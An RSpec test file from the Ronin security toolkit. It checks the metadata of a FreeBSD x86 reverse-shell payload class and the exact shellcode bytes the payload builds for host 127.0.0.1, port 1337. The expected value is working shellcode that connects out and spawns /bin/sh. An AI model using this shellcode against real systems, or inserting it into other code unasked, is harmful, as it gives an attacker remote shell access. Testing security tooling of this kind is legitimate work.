require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/freebsd/x86/reverse_shell'

describe Ronin::Payloads::Shellcode::FreeBSD::X86::ReverseShell do
  it "must inherit from Ronin::Payloads::Shellcode::ReverseShellPayload" do
    expect(described_class).to be < Ronin::Payloads::Shellcode::ReverseShellPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/freebsd/x86/reverse_shell'" do
      expect(subject.id).to eq('shellcode/freebsd/x86/reverse_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86" do
      expect(subject.arch).to be(:x86)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :freebsd" do
      expect(subject.os).to be(:freebsd)
    end
  end

  let(:host) { '127.0.0.1' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x31\xc0\x50\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89\xc2" \
        "\x68\x7f\x00\x00\x01\x66\x68\x05\x39\x66\x68\x01\x02\x89" \
        "\xe1\x6a\x10\x51\x52\x31\xc0\xb0\x62\x50\xcd\x80\x31\xc9" \
        "\x51\x52\x31\xc0\xb0\x5a\x50\xcd\x80\xfe\xc1\x80\xf9\x03" \
        "\x75\xf0\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" \
        "\x6e\x89\xe3\x50\x54\x53\xb0\x3b\x50\xcd\x80".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
